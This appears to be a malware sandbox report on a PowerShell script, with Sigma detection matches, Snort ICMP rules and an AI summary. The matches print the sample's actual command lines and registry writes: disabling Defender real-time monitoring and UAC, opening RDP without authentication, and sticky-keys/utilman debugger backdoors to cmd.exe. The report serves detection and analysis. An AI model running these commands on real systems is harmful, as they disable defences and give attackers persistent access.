sigma_analysis_results.rule_author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine Bencherchali

match_context.values: @{Details=DWORD (0x00000001); EventType=SetValue; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fAllowUnsolicited}

sigma_analysis_results.rule_title: New Firewall Rule Added Via Netsh.EXE
sigma_analysis_results.rule_description: Detects the addition of a new rule to the Windows firewall via netsh

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=netsh.exe; Hashes=SHA1=130DADD41BE6AC88692FEFA704F86B695A776250,MD5=98CC37BBF363A38834253E22C80A8F32,SHA256=D6072E8809E95B8297FBDC431FFDA58A04B845664145A8443318FC4FC2EAB573,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC; Description=Network Command Shell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\system32\netsh.exe" advfirewall firewall add rule "name=allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\netsh.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects when an attacker tries to disable User Account Control (UAC) by setting the registry value "EnableLUA" to 0.

match_context.values: @{EventID=13; EventType=SetValue; Image=C:\Windows\system32\reg.exe; Details=DWORD (0x00000000); TargetObject=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA}

sigma_analysis_results.rule_description: Detects registry modifications that hide internal tools or functions from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)

match_context.values: @{EventID=13; Details=DWORD (0x00000001); Image=C:\Windows\system32\reg.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-1015118539-3749460369-599379286-1001\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideSCAHealth}

sigma_analysis_results.rule_title: Disable Internal Tools or Feature in Registry
sigma_analysis_results.rule_description: Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique)

match_context.values: @{Details=DWORD (0x00000001); EventType=SetValue; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKU\S-1-5-21-1015118539-3749460369-599379286-1001\Software\Policies\Microsoft\Windows\Explorer\DisableNotificationCenter}

sigma_analysis_results.rule_description: Detects modification of autostart extensibility point (ASEP) in registry.
sigma_analysis_results.rule_author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)

match_context.values: @{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe\Debugger}
@{EventID=13; EventType=SetValue; Details=%WINDIR%\system32\cmd.exe; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger}

@{Details=%%windir%%\system32\cmd.exe; EventType=SetValue; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe\Debugger}

sigma_analysis_results.rule_title: RDP Sensitive Settings Changed to Zero
sigma_analysis_results.rule_description:
Detects tampering of RDP Terminal Service/Server sensitive settings.
Such as allowing unauthorized users access to a system via the 'fAllowUnsolicited' or enabling RDP via 'fDenyTSConnections', etc.
sigma_analysis_results.rule_author: Samir Bousseaden, David ANDRE, Roberto Rodriguez @Cyb3rWard0g, Nasreddine Bencherchali

match_context.values: @{EventType=SetValue; Details=DWORD (0x00000000); Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections}
@{EventType=SetValue; EventID=13; Image=C:\Windows\system32\reg.exe; Details=DWORD (0x00000000); TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fDenyTSConnections}
@{EventType=SetValue; Details=DWORD (0x00000000); Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\UserAuthentication}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{EventID=1; Image=C:\Windows\system32\windowspowershell\v1.0\powershell.exe; CommandLine=%WINDIR%\system32\windowspowershell\v1.0\powershell.exe}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -DisableRealtimeMonitoring True; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\sample.ps1"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -SubmitSamplesConsent 2; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

trid.file_type: file seems to be plain text/ASCII

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_raw: alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:"PROTOCOL-ICMP Unusual PING detected"; icode:0; itype:8; fragbits:!M; content:!"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI",depth 32; content:!"0123456789abcdefghijklmnopqrstuv",depth 32; content:!"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",depth 36; content:!"WANG2"; content:!"cacti-monitoring-system",depth 65; content:!"SolarWinds",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING Windows"; itype:8; content:"abcdefghijklmnop",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP Echo Reply"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )

crowdsourced_ai_results.analysis:
The code you provided contains a number of malicious activities, including:

* Disabling Windows Defender and real-time protection
* Disabling the Security Health Service
* Allowing Remote Desktop connections without authentication
* Setting the default debugger for a number of system processes to cmd.exe
* Disabling UAC
* Enabling the use of WDigest credentials
* Starting the WinDefend service in disabled mode

These activities could allow an attacker to gain full control of the affected system.
